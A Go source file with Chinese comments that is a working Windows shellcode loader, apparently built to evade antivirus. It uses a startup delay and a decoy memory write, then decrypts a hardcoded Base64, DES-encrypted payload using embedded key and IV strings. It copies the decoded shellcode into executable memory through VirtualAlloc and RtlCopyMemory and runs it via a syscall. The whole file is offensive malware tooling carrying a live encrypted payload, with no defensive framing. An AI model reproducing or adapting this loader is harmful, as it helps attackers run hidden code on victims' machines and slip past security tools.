package main

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"encoding/base64"
	"encoding/hex"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用kernel32.dll
	ntdll         = syscall.MustLoadDLL("ntdll.dll")      //调用ntdll.dll
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //使用kernel32.dll调用ViretualAlloc函数
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //使用ntdll调用RtCopyMemory函数
)

func main() {
	time.Sleep(3 * time.Second) // 延迟几秒执行

	// 内存加载 code 前，先压入一段无关字符串用来混淆
	var c string = "sgamfygyjffqrqwxzcvzxbsdwdqbsdbgagqwQWRQW/.OAUSHCNIADOdjfqwSFADOQIWOIJOGWEMPOSDPOOPasffvaSFAsafwfYRinJD3124651612qwrE02e"

	// 调用VirtualAllo申请一块内存
	addr1, _, _ := VirtualAlloc.Call(0, uintptr(len(c)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	//调用RtlCopyMemory加载进内存当中
	_, _, _ = RtlCopyMemory.Call(addr1, (uintptr)(unsafe.Pointer(&c)), uintptr(len(c)/2))

	Str := Readcode()                                                              // 加载 code
	deStrBytes := DecrptogDES([]byte(Base64DecodeString(Str)), []byte("fu9527ck")) // 必须8位保持一致
	code, _ := hex.DecodeString(string(deStrBytes))

	// 调用VirtualAllo申请一块内存
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}

	// 调用RtlCopyMemory加载进内存当中
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)/2))
	_, _, err = RtlCopyMemory.Call(addr+uintptr(len(code)/2), (uintptr)(unsafe.Pointer(&code[len(code)/2])), uintptr(len(code)/2))
	checkErr(err)

	//syscall来运行code
	syscall.SyscallN(addr, 0, 0, 0, 0)
}

func checkErr(err error) {
	if err != nil && err.Error() != "The operation completed successfully." {
		println(err.Error())
		os.Exit(1)
	}
}

func Readcode() string {
	// b1 := []byte("your code")
	// b2 := []byte("fu9527ck") // 必须8位
	// s := EncyptogDES(b1, b2)
	// t := base64.StdEncoding.EncodeToString(s)
	// return t
	return "jPJ5m4ZNycEirUEUgySSlpSclJRg4Wbidtou3h+yOK/VzROHF3kgzyAKuhMoz7I42KyNbHguBBbV9cAJRt6im1FVD2tLoWMc3LSUPMao5DQOsyjKhD/6BODPjAt19vroLksXYe/XGP4RcTfbp2qhH/2PrV03gqFzm8brvZDqTbVMgH4aMPFjeRdIhM2KTZ9vS703pernTVF6DT0BqHZ+wrpqSwklA+pYu79kDCBLmu5ZNqKlLjYKY9x6GQXl0c5ZZ/7nSifM1Sl/7oE/fVV3vwq/R0YB+m8f1FmBpYBnpWzzmcYCcmw5hBsFB4nf/RO+oe92i1eIrBXKRXOQ37IHo73BylSeALvQzFEQ0uDKkjyIunmgTiHSmVzVPS6G/yXlnWriIOSUoW3dC3oqQVvqfS2eGtWBPe+43QxDuuBTNq1JOZvMU+d4o/VJ6g4AeFaTMWL+EggQkVAWVcmicwFP9XYARjdwHE41cULx7XkT3k4icaOHDiAFzR+q3j+zZjNE/7iscLVDs7liI8cL8g8EAjS0CzBqReVErYdyc80E1iccRuEP20R5FaQDLV3C+BqAjLUw0Lu8Dhr76yHqONIah4eY/1ykKlH4CXMdsU8aJvitdrav4C6qFGkbNXq0HIl4FGhbNTlD73UVZIpG1S6wAtV2iGLRf47+2ftnXuXgn0HhW1SFMtiBTp2ipyKSh25K/6LE+MW9ltORoNpBgTCxa8Nb/K66SA1Iyl7IaOhQO8Q="
}

func Base64DecodeString(str string) string {
	resBytes, _ := base64.StdEncoding.DecodeString(str)
	return string(resBytes)
}

func DecrptogDES(src, key []byte) []byte {
	block, _ := des.NewCipher(key)
	iv := []byte("fucktony")
	blockeMode := cipher.NewCBCDecrypter(block, iv)
	blockeMode.CryptBlocks(src, src)
	newText := unPaddingText(src)
	return newText
}

func EncyptogDES(src, key []byte) []byte {
	block, _ := des.NewCipher(key)
	src1 := paddingText(src, block.BlockSize())

	iv := []byte("fucktony")
	blockMode := cipher.NewCBCEncrypter(block, iv)
	desc := make([]byte, len(src1))
	blockMode.CryptBlocks(desc, src1)
	return desc
}

func paddingText(str []byte, blockSize int) []byte {
	paddingCount := blockSize - len(str)%blockSize
	paddingStr := bytes.Repeat([]byte{byte(paddingCount)}, paddingCount)
	newPaddingStr := append(str, paddingStr...)
	return newPaddingStr
}

func unPaddingText(str []byte) []byte {
	n := len(str)
	count := int(str[n-1])
	newPaddingText := str[:n-count]
	return newPaddingText
}
